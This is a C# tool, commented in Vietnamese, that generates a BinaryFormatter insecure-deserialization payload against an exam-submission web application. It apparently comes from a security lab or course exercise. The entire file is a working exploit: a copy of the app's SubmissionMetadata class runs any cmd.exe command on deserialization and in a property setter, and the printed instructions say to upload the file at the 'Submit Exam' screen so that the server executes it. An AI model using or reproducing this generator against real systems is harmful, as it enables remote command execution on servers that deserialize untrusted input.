using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Xml.Serialization;

namespace PayloadGenerator
{
    // Class giống với SubmissionMetadata trong ứng dụng
    [Serializable]
    public class SubmissionMetadata : IDeserializationCallback
    {
        public int ExamId { get; set; }
        public int StudentId { get; set; }
        public string? Notes { get; set; }
        public DateTime? SubmittedAt { get; set; }
        public string? Command { get; set; }
        
        private string? _maliciousPayload;
        public string? MaliciousPayload
        {
            get => _maliciousPayload;
            set
            {
                _maliciousPayload = value;
                if (!string.IsNullOrEmpty(value) && value.StartsWith("CMD:"))
                {
                    try
                    {
                        var command = value.Substring(4);
                        var process = new System.Diagnostics.Process
                        {
                            StartInfo = new System.Diagnostics.ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c " + command,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            }
                        };
                        process.Start();
                        process.WaitForExit();
                    }
                    catch { }
                }
            }
        }
        
        public void OnDeserialization(object? sender)
        {
            if (!string.IsNullOrEmpty(Command))
            {
                try
                {
                    var process = new System.Diagnostics.Process
                    {
                        StartInfo = new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/c " + Command,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };
                    process.Start();
                    process.WaitForExit();
                }
                catch { }
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("=== Payload Generator cho Insecure Deserialization ===");
            Console.WriteLine();
            
            if (args.Length < 1)
            {
                Console.WriteLine("Cách sử dụng:");
                Console.WriteLine("  PayloadGenerator.exe <command> [output_file]");
                Console.WriteLine();
                Console.WriteLine("Ví dụ:");
                Console.WriteLine("  PayloadGenerator.exe \"whoami\" payload.bin");
                Console.WriteLine("  PayloadGenerator.exe \"calc\" exploit.bin");
                Console.WriteLine("  PayloadGenerator.exe \"echo Hello > C:\\test.txt\" test.bin");
                return;
            }

            string command = args[0];
            string outputFile = args.Length > 1 ? args[1] : "payload.bin";

            Console.WriteLine($"Tạo payload với command: {command}");
            Console.WriteLine($"Output file: {outputFile}");
            Console.WriteLine();

            // Tạo object malicious
            var payload = new SubmissionMetadata
            {
                ExamId = 1,
                StudentId = 999,
                Notes = "Malicious payload",
                SubmittedAt = DateTime.Now,
                Command = command, // Command sẽ được thực thi trong OnDeserialization
                MaliciousPayload = $"CMD:{command}" // Command cũng được thực thi trong property setter
            };

            try
            {
                // Serialize sử dụng BinaryFormatter (nguy hiểm nhất)
                using (var stream = new FileStream(outputFile, FileMode.Create))
                {
#pragma warning disable SYSLIB0011
                    var formatter = new BinaryFormatter();
                    formatter.Serialize(stream, payload);
#pragma warning restore SYSLIB0011
                }

                Console.WriteLine($"✓ Payload đã được tạo thành công: {outputFile}");
                Console.WriteLine($"  Kích thước: {new FileInfo(outputFile).Length} bytes");
                Console.WriteLine();
                Console.WriteLine("⚠ CẢNH BÁO: File này chứa mã độc!");
                Console.WriteLine("  Khi file này được deserialize trên server, command sẽ được thực thi tự động.");
                Console.WriteLine();
                Console.WriteLine("Cách khai thác:");
                Console.WriteLine($"  1. Upload file {outputFile} tại màn hình Submit Exam");
                Console.WriteLine($"  2. Server sẽ tự động deserialize và thực thi command: {command}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"✗ Lỗi khi tạo payload: {ex.Message}");
            }
        }
    }
}

